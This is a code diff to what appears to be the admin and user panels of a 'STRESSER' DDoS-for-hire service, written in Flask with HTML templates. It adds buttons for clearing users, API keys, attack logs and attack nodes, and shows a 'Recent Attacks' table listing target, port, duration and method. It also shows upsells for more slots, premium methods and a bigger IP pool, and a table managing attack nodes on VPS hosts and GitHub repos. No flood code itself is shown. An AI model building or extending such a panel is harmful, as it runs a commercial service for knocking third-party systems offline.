+            flash('All attack nodes cleared', 'success')
         return redirect(url_for('admin_settings'))
-    return render_template_string(ADMIN_SETTINGS_HTML)
+    # Get counts for display
+    stats = {
+        'users': users_col.count_documents({}),
+        'api_keys': api_keys_col.count_documents({}),
+        'attack_logs': attack_logs_col.count_documents({}),
+        'nodes': attack_nodes_col.count_documents({})
+    }
+    return render_template_string(ADMIN_SETTINGS_HTML, stats=stats)
 
 @app.route('/logout')
 def logout():
@@ -949,7 +930,7 @@ body{background:radial-gradient(circle at 10% 20%, #0a0a1a, #000); font-family:'
 <div class="mt-3"><div class="d-flex justify-content-between"><span>Network Load</span><span>{{ (slots_used/max_slots*100)|round(0) if max_slots>0 else 0 }}%</span></div><div class="progress mt-2" style="height:8px;"><div class="progress-bar bg-info" style="width: {{ (slots_used/max_slots*100) if max_slots>0 else 0 }}%"></div></div></div>
 <div class="row mt-4"><div class="col-6 text-center"><div class="stat-number">{{ slots_used }}</div><div>Slots Used</div></div><div class="col-6 text-center"><div class="stat-number">{{ max_slots }}</div><div>Max Slots</div></div></div>
 <div class="mt-4"><p class="text-muted">Upgrade for 10x Power – More slots, longer duration, premium methods, bigger IP pool.</p><a href="/products" class="btn-neon">⚡ Upgrade Now</a></div></div>
-<div class="glass-card"><h3><i class="fas fa-history me-2"></i> Recent Attacks</h3><div class="table-responsive"><table class="table table-dark table-hover"><thead><tr><th>Target</th><th>Port</th><th>Duration</th><th>Method</th><th>Status</th><th>Time</th></tr></thead><tbody>{% for a in attacks %}<tr><td>{{ a.target }}</td><td>{{ a.port }}</td><td>{{ a.duration }}s</td><td>{{ a.method }}</td><td><span class="badge bg-success">{{ a.status }}</span></td><td>{{ a.timestamp.strftime('%H:%M:%S') }}</td></tr>{% else %}<tr><td colspan="6" class="text-center">No attacks yet</td></tr>{% endfor %}</tbody></table></div></div></div>
+<div class="glass-card"><h3><i class="fas fa-history me-2"></i> Recent Attacks</h3><div class="table-responsive"><table class="table table-dark table-hover"><thead><tr><th>Target</th><th>Port</th><th>Duration</th><th>Method</th><th>Status</th><th>Time</th></td></thead><tbody>{% for a in attacks %}<tr><td>{{ a.target }}</td><td>{{ a.port }}</td><td>{{ a.duration }}s</td><td>{{ a.method }}</td><td><span class="badge bg-success">{{ a.status }}</span></td><td>{{ a.timestamp.strftime('%H:%M:%S') }}</td></tr>{% else %}<tr><td colspan="6" class="text-center">No attacks yet</td></tr>{% endfor %}</tbody></table></div></div></div>
 <script>document.getElementById('menuToggle').addEventListener('click',()=>document.getElementById('sidebar').classList.toggle('open'));</script>
 </body></html>
 '''
@@ -1112,17 +1093,29 @@ ADMIN_NODES_HTML = '''
 <div class="table-responsive mt-4"><table class="table table-dark"><thead><tr><th>Name</th><th>Type</th><th>Enabled</th><th>Status</th><th>Binary</th><th>Details</th><th>Actions</th></tr></thead><tbody>{% for n in nodes %}<tr><td>{{ n.name }}</td><td>{{ n.node_type }}</td><td>{% if n.enabled %}<span class="text-success">✔</span>{% else %}<span class="text-danger">✘</span>{% endif %}</td><td class="{% if n.last_status == 'online' %}status-online{% else %}status-offline{% endif %}">{{ n.last_status|default('unknown') }}</td><td>{% if n.binary_present %}<span class="text-success">✓</span>{% else %}<span class="text-danger">✗</span>{% endif %}</td><td>{% if n.node_type=='github' %}{{ n.github_repo }}{% else %}{{ n.vps_host }}:{{ n.vps_port }}{% endif %}</td><td><form method="POST" action="/admin/nodes/{{ n.id }}/check" style="display:inline"><button class="btn btn-sm btn-info">Check</button></form> <form method="POST" action="/admin/nodes/{{ n.id }}/toggle" style="display:inline"><button class="btn btn-sm btn-warning">Toggle</button></form> <form method="POST" action="/admin/nodes/{{ n.id }}/delete" style="display:inline" onsubmit="return confirm('Delete node?')"><button class="btn btn-sm btn-danger">Delete</button></form></td></tr>{% endfor %}</tbody></table></div></div></div>
 </body></html>
 '''
-
 ADMIN_SETTINGS_HTML = '''
 <!DOCTYPE html>
 <html><head><title>Admin Settings • STRESSER</title><meta name="viewport" content="width=device-width, initial-scale=1">
 <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
 <style>body{background:#0a0a1a; color:#fff; padding:20px;}
-.glass-card{background:rgba(15,25,45,0.45);border-radius:24px;padding:20px;}
+.glass-card{background:rgba(15,25,45,0.45);border-radius:24px;padding:20px;margin-bottom:20px;}
+.btn-danger{background:#ff3355;}
+.btn-warning{background:#ffaa00; color:#000;}
 </style>
 </head>
 <body><div class="container"><div class="glass-card"><h2>Admin Settings</h2>
-<form method="POST"><div class="mb-3"><label>Change Admin Password</label><input type="password" name="new_admin_password" class="form-control bg-dark text-white" placeholder="New password (min 6 chars)" required></div><button type="submit" class="btn btn-primary">Update Password</button></form>
+<form method="POST">
+    <div class="mb-3"><label>Change Admin Password</label><input type="password" name="new_admin_password" class="form-control bg-dark text-white" placeholder="New password (min 6 chars)" required></div>
+    <button type="submit" class="btn btn-primary">Update Password</button>
+</form>
+<hr>
+<h3>Storage Management</h3>
+<div class="row">
+    <div class="col-md-3 mb-2"><form method="POST" onsubmit="return confirm('Clear ALL users? This cannot be undone.');"><input type="hidden" name="clear_users" value="1"><button type="submit" class="btn btn-danger w-100">Clear Users ({{ stats.users }})</button></form></div>
+    <div class="col-md-3 mb-2"><form method="POST" onsubmit="return confirm('Clear ALL API keys? This cannot be undone.');"><input type="hidden" name="clear_api_keys" value="1"><button type="submit" class="btn btn-danger w-100">Clear API Keys ({{ stats.api_keys }})</button></form></div>
+    <div class="col-md-3 mb-2"><form method="POST" onsubmit="return confirm('Clear ALL attack logs? This cannot be undone.');"><input type="hidden" name="clear_attack_logs" value="1"><button type="submit" class="btn btn-warning w-100">Clear Attack Logs ({{ stats.attack_logs }})</button></form></div>
+    <div class="col-md-3 mb-2"><form method="POST" onsubmit="return confirm('Clear ALL attack nodes? This cannot be undone.');"><input type="hidden" name="clear_nodes" value="1"><button type="submit" class="btn btn-danger w-100">Clear Nodes ({{ stats.nodes }})</button></form></div>
+</div>
 <a href="/admin/dashboard" class="btn btn-secondary mt-3">← Back</a></div></div>
 </body></html>
 '''
